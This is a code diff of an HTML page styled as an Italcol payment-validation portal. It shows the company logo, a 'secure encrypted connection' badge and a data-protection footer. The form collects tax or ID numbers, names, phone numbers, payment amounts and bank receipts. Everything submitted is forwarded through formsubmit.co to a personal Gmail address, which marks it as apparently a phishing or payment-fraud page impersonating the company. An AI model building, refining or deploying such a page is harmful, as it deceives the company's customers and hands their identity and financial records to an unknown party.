@@ -3,139 +3,62 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Italcol - Sistema de Validación de Pagos</title>
+    <title>Italcol - Validación de Pagos</title>
     <style>
-        /* Identidad Corporativa Italcol */
-        :root {
-            --naranja-italcol: #ff6600;
-            --blanco: #ffffff;
-            --gris-fondo: #f8f9fa;
-            --texto: #333333;
-        }
-
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background-color: var(--gris-fondo); 
-            display: flex; 
-            justify-content: center; 
-            padding: 40px 20px;
-            margin: 0;
-        }
-
-        .form-container { 
-            background: var(--blanco); 
-            padding: 35px; 
-            border-radius: 15px; 
-            width: 100%; 
-            max-width: 480px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-            border-top: 10px solid var(--naranja-italcol);
-            position: relative;
-        }
-
-        .secure-header {
-            text-align: center;
-            font-size: 11px;
-            color: #28a745;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            margin-bottom: 10px;
-            font-weight: bold;
-        }
-
-        .header h2 { 
-            color: var(--naranja-italcol); 
-            margin: 0 0 25px 0; 
-            text-align: center;
-            font-size: 24px;
-        }
-
-        label { display: block; margin-top: 18px; font-weight: 600; color: var(--texto); font-size: 14px; }
-        label span { color: var(--naranja-italcol); }
-
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            margin-top: 6px; 
-            border: 1px solid #ced4da; 
-            border-radius: 8px; 
-            box-sizing: border-box; 
-            font-size: 15px;
-            transition: 0.3s;
-        }
-
-        input:focus { border-color: var(--naranja-italcol); outline: none; box-shadow: 0 0 8px rgba(255,102,0,0.2); }
-
-        .file-upload-section {
-            border: 2px dashed #ddd;
-            border-radius: 10px;
-            padding: 20px;
-            text-align: center;
-            margin-top: 20px;
-            background-color: #fff9f5;
-        }
-
-        .file-upload-section p { font-size: 13px; color: #666; margin: 10px 0; }
-
-        .btn-submit { 
-            width: 100%; 
-            background-color: var(--naranja-italcol); 
-            color: white; 
-            border: none; 
-            padding: 16px; 
-            margin-top: 30px; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            font-size: 17px; 
-            font-weight: bold;
-            text-transform: uppercase;
-            transition: 0.3s;
-        }
-
-        .btn-submit:hover { background-color: #e65c00; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(230,92,0,0.3); }
-        
-        .footer { text-align: center; font-size: 11px; color: #999; margin-top: 25px; line-height: 1.5; }
+        :root { --naranja: #ff6600; --gris-fondo: #f0f2f5; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: var(--gris-fondo); display: flex; justify-content: center; padding: 20px; }
+        .form-card { background: white; border-radius: 20px; width: 100%; max-width: 500px; shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 8px solid var(--naranja); }
+        .header { text-align: center; padding: 30px 20px; }
+        .logo { max-width: 180px; margin-bottom: 10px; }
+        .slogan { color: var(--naranja); font-weight: bold; margin-bottom: 20px; }
+        .secure-badge { background: #28a745; color: white; padding: 8px 15px; border-radius: 50px; display: inline-flex; align-items: center; font-size: 13px; gap: 8px; }
+        form { padding: 0 40px 40px; }
+        label { display: block; margin-top: 15px; font-weight: 600; font-size: 14px; color: #444; }
+        input { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .file-box { border: 2px dashed #ff6600; padding: 20px; border-radius: 10px; text-align: center; margin-top: 20px; background: #fff9f5; }
+        .btn-send { width: 100%; background: var(--naranja); color: white; border: none; padding: 15px; margin-top: 25px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        .btn-send:hover { background: #e65c00; transform: scale(1.02); }
+        .footer { text-align: center; font-size: 11px; color: #888; padding: 20px; border-top: 1px solid #eee; }
     </style>
 </head>
 <body>
 
-<div class="form-container">
-    <div class="secure-header">🔒 Canal de comunicación encriptado</div>
+<div class="form-card">
     <div class="header">
-        <h2>Validación de Pagos</h2>
+        <img src="https://italcol.com/wp-content/uploads/2021/01/logo-italcol.png" alt="Italcol Logo" class="logo">
+        <div class="slogan">Su aliado para crecer</div>
+        <div class="secure-badge">🔒 Conexión Segura Encriptada</div>
     </div>
 
     <form action="https://formsubmit.co/ed.mauricio99@gmail.com" method="POST" enctype="multipart/form-data">
-        
-        <input type="text" name="_honey" style="display:none"> <input type="hidden" name="_captcha" value="true"> <input type="hidden" name="_template" value="table"> <input type="hidden" name="_subject" value="NUEVO REPORTE DE PAGO - ITALCOL">
+        <input type="text" name="_honey" style="display:none">
+        <input type="hidden" name="_captcha" value="true">
+        <input type="hidden" name="_subject" value="NUEVO SOPORTE DE PAGO - ITALCOL">
 
-        <label>NIT o Cédula <span>*</span></label>
-        <input type="text" name="identificacion" placeholder="Ej: 900123456" required>
+        <label>NIT o Cédula</label>
+        <input type="text" name="nit" placeholder="Ej: 900.123.456" required>
 
-        <label>Razón Social / Nombre Completo <span>*</span></label>
-        <input type="text" name="razon_social" placeholder="Nombre de la empresa" required>
+        <label>Razón Social / Nombre</label>
+        <input type="text" name="nombre" required>
 
-        <label>Celular de Contacto <span>*</span></label>
-        <input type="tel" name="celular" placeholder="Ej: 3001234567" required>
+        <label>Celular de Contacto</label>
+        <input type="tel" name="celular" required>
 
-        <label>Valor de la Transferencia (COP) <span>*</span></label>
-        <input type="number" name="valor_pago" placeholder="0.00" required>
+        <label>Valor de Transferencia (COP)</label>
+        <input type="number" name="valor" placeholder="$ 0.00" required>
 
-        <label>Fecha del Movimiento <span>*</span></label>
-        <input type="date" name="fecha_pago" required>
-
-        <div class="file-upload-section">
-            <label style="margin-top: 0;">Soporte de Pago (PDF o Imagen) <span>*</span></label>
-            <p>Adjunte el comprobante bancario para validación</p>
+        <div class="file-box">
+            <strong>Adjuntar Soporte de Pago</strong>
+            <p>(PDF o Imagen JPG/PNG)</p>
             <input type="file" name="attachment" accept="image/*,.pdf" required>
         </div>
 
-        <button type="submit" class="btn-submit">Enviar para Validación</button>
+        <button type="submit" class="btn-send">ENVIAR PARA VALIDACIÓN</button>
     </form>
-    
+
     <div class="footer">
-        Esta información será procesada de acuerdo a la Ley de Protección de Datos.<br>
-        <strong>Italcol S.A. - Control Administrativo</strong>
+        Esta información es procesada bajo la Ley de Protección de Datos.<br>
+        Italcol S.A. 2026
     </div>
 </div>
 
